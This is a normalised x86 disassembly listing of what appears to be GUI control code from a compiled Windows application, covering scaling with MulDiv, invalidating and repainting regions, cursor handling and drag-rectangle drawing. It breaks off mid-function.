mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_434294
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43438f
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_4032f4
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434396
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413b90
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_4032f4
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_4032f4
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413898
sub_4343a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_434ed8
mov edx edi
mov eax ebx
call sub_434450
mov edx edi
mov eax ebx
call sub_435d00
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43440c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403f08
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_434450
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4344ac
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4344d8
mov edx eax
mov ecx esp
mov eax esi
call sub_412598
mov edx esp
mov eax ebx
call sub_43491c
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4344f0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_434494
mov ecx esp
mov edx esi
call sub_412598
mov edx esp
mov eax ebx
call sub_43491c
pop ecx
pop edx
pop esi
pop ebx
retn
sub_434518
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434599
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4345a0
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
sub_4345a8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4345d4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_434600
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_44f7f4
sub_434630
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_435c5c
sub_4346ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41cfac
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41cfc8
sub_434878
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43490e
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41a234
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_434a90
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4042c0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434915
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_434ac0
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_43491c
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_434964
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
test esi esi
je r-xdata
mov edx ebx
call sub_437f08
mov edx ebx
mov eax esi
call sub_437e34
mov eax ebx
call sub_4340e4
sub_4349b0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_4032f4
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_435c5c
mov eax edi
mov si 0xffd0
call sub_4032f4
sub_434a48
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4485b4
mov edx ebx
mov eax esi
call sub_419dac
sub_434a6c
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_435c5c
pop ebx
retn
sub_434a90
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_434a04
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_403fa4
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_434a14
sub_434ac0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434b15
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_434a90
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4042c0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434b1c
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax esi
call sub_404374
mov edx eax
mov eax ebx
call sub_434a6c
sub_434b40
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41cf08
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_435c5c
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41cf08
mov [ ebx + 0x84 ] eax
sub_434cc8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_434cb8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_431c60
mov eax esi
call sub_431c60
jmp r-xdata
sub_434d00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_413a50
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4138e4
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_413a70
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_434ed8
mov eax ebx
call sub_44b744
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_4032f4
sub_434d80
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_434d00
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_434d00
jmp r-xdata
sub_434da4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_434e3a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434e41
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
sub_434e4c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_413a50
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4139f4
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_434430
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434ed8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b594
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_434430
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b290
push eax
call InvalidateRect
push ebp
call sub_434e4c
pop ecx
test al al
je r-xdata
mov al 0x1
sub_434f74
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44b71c
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_435c5c
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_4032f4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434fd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b594
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b290
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_4350b1
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43909c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b290
push eax
call ReleaseDC
retn
sub_435150
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax edi
call sub_435c90
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4345d4
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4067b4
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_435c5c
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_432de0
sub_435224
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_435260
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4352ac
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_4352d8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_434a34
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_434a20
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402920
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402920
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_43b290
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_4353bc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_435408
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_4032f4
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_4032f4
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_4354cc
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_435518
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_435564
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43567f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41d528
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
